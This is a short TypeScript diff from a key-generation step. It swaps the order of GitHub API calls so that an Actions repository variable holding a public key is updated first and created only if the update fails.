@@ -172,11 +172,13 @@ export async function phaseKeygen(
         headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
       });
       try {
-        await octokit.request("POST /repos/{owner}/{repo}/actions/variables", {
+        // Try update first (common case — variable already exists)
+        await octokit.request("PATCH /repos/{owner}/{repo}/actions/variables/{name}", {
           owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
         });
       } catch {
-        await octokit.request("PATCH /repos/{owner}/{repo}/actions/variables/{name}", {
+        // Variable doesn't exist yet — create it
+        await octokit.request("POST /repos/{owner}/{repo}/actions/variables", {
           owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
         });
       }
